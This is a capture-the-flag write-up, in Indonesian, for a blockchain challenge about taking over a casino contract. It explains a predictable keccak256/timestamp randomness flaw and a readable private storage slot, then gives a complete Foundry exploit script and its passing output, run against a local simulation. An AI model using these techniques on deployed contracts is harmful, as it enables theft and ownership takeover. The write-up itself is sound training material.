# Inju's Gambit **[LOCAL SIMULATION]**

> **NOTE:** WriteUp ini dibuat berdasarkan simulasi solver di lingkungan lokal (Foundry) karena instance challenge sedang tidak aktif.

## Overview

* **Judul**: Inju's Gambit
* **Kategori**: Blockchain
* **Poin**: 1000 pts
* **Author**: Kiinzu
* **Deskripsi**: Mengambil alih kepemilikan kasino dan memecat manajernya.

## Analisis Vulnerability

Terdapat dua celah keamanan (Chained Vulnerability) yang dieksploitasi:

### 1. Predictable Randomness (Weak RNG)

Fungsi `upgradeChallengerAttribute` menggunakan entropi yang lemah untuk menentukan hasil Gacha.

```solidity
uint256 gacha = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4;

```

Karena `msg.sender` dan `block.timestamp` dapat diprediksi atau dimanipulasi, kita bisa memprediksi kapan `gacha` akan bernilai `1` (Upgrade Self).

### 2. Private Variable Leak (Storage Reading)

Untuk mengambil alih `casinoOwner`, diperlukan `_key` yang cocok dengan `masterKey`.

```solidity
bytes32 private masterKey; // Defined in ChallengeManager

```

Meskipun variabel bersifat `private`, data ini disimpan di **Storage Slot 1** EVM dan bersifat publik bagi siapa saja yang membaca raw storage.

## Skenario Eksploitasi

1. **Registrasi**: Mendaftar sebagai Challenger (biaya 5 Ether).
2. **Grinding Attribute (RNG Exploit)**:
* Loop prediksi `keccak256(..., timestamp) % 4`.
* Jika hasil `1`, panggil `upgradeChallengerAttribute`.
* Jika tidak, skip waktu (`vm.warp`) dan coba lagi.
* Ulangi hingga status `hasVIPCard` tercapai.


3. **Steal Master Key**:
* Membaca **Storage Slot 1** pada kontrak `ChallengeManager`.


4. **Takeover**:
* Panggil `challengeCurrentOwner(leakedKey)` untuk menjadi owner.


5. **Finish**:
* Panggil `privileged.fireManager()`.



## Script Solver (`test/Local-Solve.t.sol`)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "../src/Setup.sol";
import "../src/ChallengeManager.sol";
import "../src/Privileged.sol";

contract LocalSolve is Test {
    Setup setup;
    ChallengeManager manager;
    Privileged privileged;
    
    address attacker = makeAddr("hengker_inju");

    function setUp() public {
        bytes32 secretKey = keccak256("RAHASIA_DAPUR_INJU");
        setup = new Setup{value: 110 ether}(secretKey);
        manager = setup.challengeManager();
        privileged = setup.privileged();
        vm.deal(attacker, 10 ether);
    }

    function test_Exploit() public {
        vm.startPrank(attacker);

        console.log("=== START EXPLOIT ===");
        
        // 1. Daftar
        manager.approach{value: 5 ether}();
        uint256 myId = 3; 
        uint256 strangerId = 1;

        // 2. Grinding Attribute (Predictable RNG)
        console.log("Grinding Gacha...");
        while(true) {
            Privileged.casinoOwnerChallenger memory status = privileged.getRequirmenets(myId);
            if (status.hasVIPCard) {
                console.log("[SUCCESS] VIP Card Acquired!");
                break;
            }

            // Prediksi: Mau hasil 1
            uint256 rng = uint256(keccak256(abi.encodePacked(attacker, block.timestamp))) % 4;

            if (rng == 1) {
                manager.upgradeChallengerAttribute(myId, strangerId);
            } else {
                vm.warp(block.timestamp + 13); // Reroll RNG
            }
        }

        // 3. Baca Storage Slot 1 (masterKey)
        console.log("Stealing Master Key...");
        bytes32 leakedKey = vm.load(address(manager), bytes32(uint256(1)));
        
        console.log("Leaked Key:");
        console.logBytes32(leakedKey);

        // 4. Takeover & Fire
        console.log("Taking Over Casino...");
        manager.challengeCurrentOwner(leakedKey);

        console.log("Firing Manager...");
        privileged.fireManager();

        vm.stopPrank();

        // 5. Verifikasi
        bool solved = setup.isSolved();
        console.log("Is Solved?", solved);
        assertTrue(solved, "GAGAL: Manager belum dipecat!");
    }
}

```

## Output Terminal

```bash
$ forge test --match-path test/Local-Solve.t.sol -vv

[PASS] test_Exploit() (gas: 291921)
Logs:
  === START EXPLOIT ===
  Grinding Gacha...
  [SUCCESS] VIP Card Acquired!
  Stealing Master Key...
  Leaked Key:
  0x29fb8d6746a8ff9212c482bd78eb2a2745f89be8d31d892392c8f1bebb7e16d9
  Taking Over Casino...
  Firing Manager...
  Is Solved? true

```
